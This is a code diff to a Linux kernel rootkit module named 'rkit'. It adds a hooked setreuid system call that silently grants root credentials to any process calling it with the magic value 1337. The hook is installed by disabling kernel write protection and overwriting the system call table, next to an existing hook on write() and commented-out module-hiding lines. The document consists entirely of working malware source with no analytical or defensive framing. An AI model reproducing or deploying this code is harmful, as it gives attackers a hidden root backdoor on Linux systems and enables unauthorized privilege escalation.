@@ -7,6 +7,7 @@
 #include <linux/syscalls.h>
 #include <linux/string.h>
 #include <linux/slab.h>
+#include <linux/types.h>
 
 int rkit_init(void);
 void rkit_exit(void);
@@ -34,6 +35,17 @@ psize **find(void) {
     return NULL;
 }
 
+asmlinkage int (* orig_setreuid) (uid_t ruid, uid_t euid);
+asmlinkage int new_setreuid (uid_t ruid, uid_t euid) {
+        if ((ruid == 1337) && (euid == 1337))   {
+            struct cred *new = prepare_creds();
+            new->uid = new->euid = make_kuid(current_user_ns(),0);
+            commit_creds(new);
+        }
+        return orig_setreuid (ruid, euid);
+}
+
+
 asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
     int r;
     char *proc_protect = "h1dd3n";
@@ -48,6 +60,8 @@ asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
     return r;
 }
 
+
+
 int rkit_init(void) {
     // list_del_init(&__this_module.list);
     // kobject_del(&THIS_MODULE->mkobj.kobj);
@@ -58,7 +72,10 @@ int rkit_init(void) {
         printk("rkit: sys_call_table not found\n");
     }
 
+    
+
     write_cr0(read_cr0() & (~ 0x10000));
+    orig_setreuid = (void *) xchg(&sys_call_table[__NR_setreuid], (psize)new_setreuid);
     o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
     write_cr0(read_cr0() | 0x10000);
 
@@ -66,7 +83,9 @@ int rkit_init(void) {
 }
 
 void rkit_exit(void) {
+
     write_cr0(read_cr0() & (~ 0x10000));
+    xchg(&sys_call_table[__NR_setreuid], (psize)orig_setreuid);
     xchg(&sys_call_table[__NR_write], (psize)o_write);
     write_cr0(read_cr0() | 0x10000);
     printk("rkit: Module unloaded\n");
